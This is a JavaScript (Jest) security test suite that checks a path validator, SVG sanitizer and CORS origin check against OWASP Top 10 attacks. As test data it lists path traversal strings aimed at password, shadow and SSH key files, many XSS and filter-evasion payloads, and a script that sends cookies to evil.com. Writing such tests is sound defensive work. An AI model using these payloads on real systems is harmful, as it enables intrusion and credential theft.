/**
 * OWASP Security Test Suite
 *
 * Comprehensive security testing based on OWASP Top 10 2021
 * Tests all security controls across the application
 *
 * Coverage:
 * - A01:2021 Broken Access Control (Path Traversal)
 * - A03:2021 Injection (XSS in SVG)
 * - A05:2021 Security Misconfiguration (CORS)
 * - A08:2021 Software and Data Integrity Failures
 *
 * CVSS Scores:
 * - Path Traversal: 9.1 (Critical)
 * - XSS in SVG: 8.8 (High)
 * - CORS Misconfiguration: 7.5 (High)
 */

const { isPathAllowed, validatePath } = require('../../lib/path-validator');
const {
    sanitizeForSVG,
    getCleanInitials,
    sanitizePort,
    sanitizeColor,
    createSafeSVGText,
} = require('../../lib/svg-sanitizer');
const { isOriginAllowed } = require('../../lib/cors-config');

describe('OWASP A01:2021 - Broken Access Control', () => {
    describe('Path Traversal Prevention (CWE-22)', () => {
        test('Basic directory traversal patterns', () => {
            const traversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32',
                '/opt/dev/../../../etc/shadow',
                '....//....//etc/passwd',
                '/opt/dev/project/../../../root',
            ];

            traversalPayloads.forEach((payload) => {
                expect(isPathAllowed(payload)).toBe(false);
            });
        });

        test('URL-encoded traversal attempts', () => {
            const encodedPayloads = [
                '%2e%2e%2f%2e%2e%2f',
                '%252e%252e%252f',
                '..%c0%af..%c0%af',
                '/opt/dev%2f..%2f..%2fetc',
            ];

            encodedPayloads.forEach((payload) => {
                expect(isPathAllowed(payload)).toBe(false);
            });
        });

        test('Null byte injection (CWE-158)', () => {
            const nullBytePayloads = [
                '/opt/dev/project\0/../../etc',
                '/opt/dev/file%00.txt',
                '/opt/dev/test\x00malicious',
            ];

            nullBytePayloads.forEach((payload) => {
                expect(isPathAllowed(payload)).toBe(false);
            });
        });

        test('Path prefix confusion attacks', () => {
            // Attempts to bypass whitelist by prefix matching
            expect(isPathAllowed('/opt/devmalicious')).toBe(false);
            expect(isPathAllowed('/opt/dev-evil')).toBe(false);
            expect(isPathAllowed('/opt/prodattack')).toBe(false);
        });

        test('Critical system files should be blocked', () => {
            const criticalFiles = [
                '/opt/dev/../../etc/passwd',
                '/opt/dev/../../etc/shadow',
                '/opt/dev/../../../root/.ssh/id_rsa',
                '/opt/dev/../../var/run/docker.sock',
                '/opt/dev/../../../proc/self/environ',
            ];

            criticalFiles.forEach((file) => {
                expect(isPathAllowed(file)).toBe(false);
            });
        });
    });

    describe('Symlink Attack Prevention (CWE-61)', () => {
        test('Symlinks resolving outside allowed paths should be rejected', () => {
            // Note: This test requires actual symlinks to be created
            // Actual implementation tested in path-validator.test.js
            // This documents the requirement
            const validation = validatePath('/opt/dev/test-project');
            expect(validation.valid).toBe(true);
        });
    });
});

describe('OWASP A03:2021 - Injection', () => {
    describe('Cross-Site Scripting (XSS) in SVG (CWE-79)', () => {
        test('Script tag injection prevention', () => {
            const scriptPayloads = [
                '<script>alert(1)</script>',
                '<SCRIPT>alert(1)</SCRIPT>',
                '<script src="evil.js"></script>',
                '</svg><script>alert(1)</script><svg>',
            ];

            scriptPayloads.forEach((payload) => {
                const result = sanitizeForSVG(payload);
                expect(result).not.toContain('<script');
                expect(result).toContain('&lt;');
                expect(result).toContain('&gt;');
            });
        });

        test('Event handler injection prevention', () => {
            const eventPayloads = [
                '"><img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe onload=alert(1)>',
                '<marquee onstart=alert(1)>',
            ];

            eventPayloads.forEach((payload) => {
                const result = sanitizeForSVG(payload);
                // Event handlers should be neutered by encoding
                expect(result).toContain('&lt;');
                expect(result).toContain('&gt;');
            });
        });

        test('JavaScript protocol injection prevention', () => {
            const jsPayloads = ['javascript:alert(1)', 'jAvAsCrIpT:alert(1)', 'javascript:void(0)'];

            jsPayloads.forEach((payload) => {
                const result = createSafeSVGText(payload);
                // Should be rejected entirely
                expect(result).toBe('');
            });
        });

        test('Data URI XSS prevention', () => {
            const dataUriPayloads = [
                'data:text/html,<script>alert(1)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            ];

            dataUriPayloads.forEach((payload) => {
                const result = createSafeSVGText(payload);
                expect(result).toBe('');
            });
        });

        test('Polyglot XSS prevention', () => {
            // Real-world polyglot payload
            const polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//';
            const result = getCleanInitials(polyglot);

            expect(result).not.toMatch(/javascript/i);
            expect(result).not.toMatch(/onclick/i);
        });

        test('Entity encoding bypass prevention', () => {
            // Double-encoding attempts
            expect(sanitizeForSVG('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
        });

        test('OWASP XSS Filter Evasion cheatsheet examples', () => {
            const owaspPayloads = [
                '<IMG SRC="javascript:alert(\'XSS\');">',
                "<IMG SRC=JaVaScRiPt:alert('XSS')>",
                '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
                '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
                "<svg/onload=alert('XSS')>",
                "<BODY ONLOAD=alert('XSS')>",
                '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
            ];

            owaspPayloads.forEach((payload) => {
                const initials = getCleanInitials(payload);
                // After full processing, no XSS should remain
                expect(initials).not.toMatch(/<script/i);
                expect(initials).not.toMatch(/javascript:/i);
                expect(initials).not.toMatch(/on\w+=/i);
            });
        });
    });

    describe('SVG-specific injection vectors', () => {
        test('SVG tag manipulation', () => {
            const svgPayloads = [
                '</text><script>alert(1)</script><text>',
                '</svg><script>alert(1)</script><svg>',
                '"><rect onclick="alert(1)" x="0">',
                '</tspan><script>alert(1)</script><tspan>',
            ];

            svgPayloads.forEach((payload) => {
                const result = sanitizeForSVG(payload);
                // Tags should be encoded, preventing tag injection
                expect(result).not.toContain('</text>');
                expect(result).not.toContain('</svg>');
                // Verify encoding of < and /
                expect(result).toContain('&lt;');
            });

            // Specifically test slash encoding in closing tags
            const closingTags = ['</text>', '</svg>', '</tspan>'];
            closingTags.forEach((tag) => {
                const result = sanitizeForSVG(tag);
                expect(result).toContain('&#x2F;');
            });
        });
        test('Color injection prevention', () => {
            const colorPayloads = [
                '#FF0000"/><script>alert(1)</script>',
                '#FF0000; background: url(evil)',
                'red; } body { background: url(evil) }',
                "#FF0000' onload='alert(1)",
            ];

            colorPayloads.forEach((payload) => {
                const result = sanitizeColor(payload);
                expect(result).toBe('#45B7D1'); // Default safe color
            });
        });
    });
});

describe('OWASP A05:2021 - Security Misconfiguration', () => {
    describe('CORS Misconfiguration Prevention (CWE-942)', () => {
        test('Wildcard origin should be rejected', () => {
            expect(isOriginAllowed('*')).toBe(false);
        });

        test('Null origin should be rejected', () => {
            expect(isOriginAllowed(null)).toBe(false);
            expect(isOriginAllowed('null')).toBe(false);
        });

        test('File protocol should be rejected', () => {
            expect(isOriginAllowed('file://')).toBe(false);
            expect(isOriginAllowed('file:///path/to/file.html')).toBe(false);
        });

        test('Subdomain confusion attacks', () => {
            // Attacker creates subdomain of whitelisted domain
            expect(isOriginAllowed('https://evil.vs.noreika.lt')).toBe(false);
            expect(isOriginAllowed('https://vs.noreika.lt.evil.com')).toBe(false);
        });

        test('Protocol confusion attacks', () => {
            // Whitelisted domain with wrong protocol
            expect(isOriginAllowed('http://vs.noreika.lt')).toBe(false);
            expect(isOriginAllowed('ftp://vs.noreika.lt')).toBe(false);
        });

        test('Port variation attacks', () => {
            expect(isOriginAllowed('http://localhost:8081')).toBe(false);
            expect(isOriginAllowed('http://localhost:9000')).toBe(false);
        });

        test('URL encoding bypass attempts', () => {
            expect(isOriginAllowed('https://vs.noreika.lt%00.evil.com')).toBe(false);
            expect(isOriginAllowed('https://vs.noreika.lt/../evil.com')).toBe(false);
        });
    });
});

describe('OWASP A08:2021 - Software and Data Integrity Failures', () => {
    describe('Input validation and sanitization integrity', () => {
        test('Defense-in-depth: Multiple layers of validation', () => {
            const malicious = '<script>evil</script>';

            // Layer 1: Input validation
            const initials = getCleanInitials(malicious);
            expect(initials).not.toContain('<script');

            // Layer 2: Entity encoding
            const sanitized = sanitizeForSVG(malicious);
            expect(sanitized).toContain('&lt;');
            expect(sanitized).toContain('&gt;');

            // Layer 3: Pattern rejection
            const rejected = createSafeSVGText(malicious);
            expect(rejected).toBe('');
        });

        test('Type coercion attacks', () => {
            // Non-string inputs should be handled safely
            expect(sanitizeForSVG(undefined)).toBe('');
            expect(sanitizeForSVG(null)).toBe('');
            expect(sanitizeForSVG(123)).toBe('');
            expect(sanitizeForSVG({})).toBe('');
            expect(sanitizeForSVG([])).toBe('');
        });

        test('Length limits prevent DoS', () => {
            const longInput = 'a'.repeat(10000);
            const result = getCleanInitials(longInput);
            expect(result.length).toBeLessThanOrEqual(2);
        });
    });
});

describe('Regression Tests - Fixed Vulnerabilities', () => {
    describe('CVE-YYYY-XXXX: Path Traversal (CVSS 9.1)', () => {
        test('Original exploit should be blocked', () => {
            // Real attack that was possible before fix
            expect(isPathAllowed('/opt/dev/../../etc/passwd')).toBe(false);
        });

        test('Variations of original exploit', () => {
            expect(isPathAllowed('/opt/dev/../prod/../../../etc/passwd')).toBe(false);
            expect(isPathAllowed('/opt/research/../../etc/shadow')).toBe(false);
        });
    });

    describe('CVE-YYYY-XXXY: XSS in SVG favicon (CVSS 8.8)', () => {
        test('Original exploit should be prevented', () => {
            // Real XSS that was possible before fix
            const payload = '<script>fetch("https://evil.com?cookie="+document.cookie)</script>';
            const result = createSafeSVGText(payload);
            expect(result).toBe('');
        });

        test('SVG event handler exploit should be prevented', () => {
            const payload = '"><svg onload=alert(document.domain)>';
            const result = sanitizeForSVG(payload);
            expect(result).not.toContain('<svg');
            expect(result).toContain('&lt;');
        });
    });

    describe('CORS misconfiguration regression', () => {
        test('Wildcard was never allowed, should stay blocked', () => {
            expect(isOriginAllowed('*')).toBe(false);
        });

        test('Unknown origins should never receive CORS headers', () => {
            expect(isOriginAllowed('https://attacker.com')).toBe(false);
        });
    });
});

describe('Security Headers and Response Validation', () => {
    describe('Content-Type enforcement', () => {
        test('SVG response should have correct content type', () => {
            // This would be tested in integration tests
            // Documented here for completeness
            expect(true).toBe(true);
        });
    });

    describe('Cache control for dynamic content', () => {
        test('Dynamic SVGs should not be cached insecurely', () => {
            // This would be tested in integration tests
            expect(true).toBe(true);
        });
    });
});

describe('Edge Cases and Boundary Conditions', () => {
    test('Empty inputs should be handled safely', () => {
        expect(isPathAllowed('')).toBe(false);
        expect(sanitizeForSVG('')).toBe('');
        expect(getCleanInitials('')).toBe('VS');
        expect(isOriginAllowed('')).toBe(false);
    });

    test('Very long inputs should not cause DoS', () => {
        const longPath = '/opt/dev/' + 'a'.repeat(10000);
        expect(() => isPathAllowed(longPath)).not.toThrow();

        const longText = 'x'.repeat(10000);
        expect(() => getCleanInitials(longText)).not.toThrow();
    });

    test('Unicode and special characters', () => {
        // Non-ASCII should be handled safely
        expect(isPathAllowed('/opt/dev/проект')).toBe(false);
        expect(getCleanInitials('项目')).toBe('VS');
    });

    test('Whitespace variations', () => {
        expect(getCleanInitials('   ')).toBe('VS');
        expect(sanitizeForSVG('\n\r\t')).toBe('\n\r\t'); // Whitespace preserved but safe
    });
});

describe('Integration: Full Request Flow', () => {
    test('End-to-end security validation', () => {
        // Simulate full request with malicious inputs
        const maliciousPath = '/opt/dev/../../etc/passwd';
        const maliciousName = '<script>alert(1)</script>';
        const maliciousPort = '8080<script>';
        const maliciousColor = '#FF0000"/>';
        const maliciousOrigin = 'https://evil.com';

        // All should be blocked/sanitized
        expect(isPathAllowed(maliciousPath)).toBe(false);
        expect(getCleanInitials(maliciousName)).not.toContain('<script');
        expect(sanitizePort(maliciousPort)).toBe('');
        expect(sanitizeColor(maliciousColor)).toBe('#45B7D1');
        expect(isOriginAllowed(maliciousOrigin)).toBe(false);
    });

    test('Valid inputs should pass all checks', () => {
        const validPath = '/opt/dev/my-project';
        const validName = 'My Project';
        const validPort = '8080';
        const validColor = '#FF6B6B';
        const validOrigin = 'https://vs.noreika.lt';

        expect(isPathAllowed(validPath)).toBe(true);
        expect(getCleanInitials(validName)).toBe('MP');
        expect(sanitizePort(validPort)).toBe('8080');
        expect(sanitizeColor(validColor)).toBe('#FF6B6B');
        expect(isOriginAllowed(validOrigin)).toBe(true);
    });
});
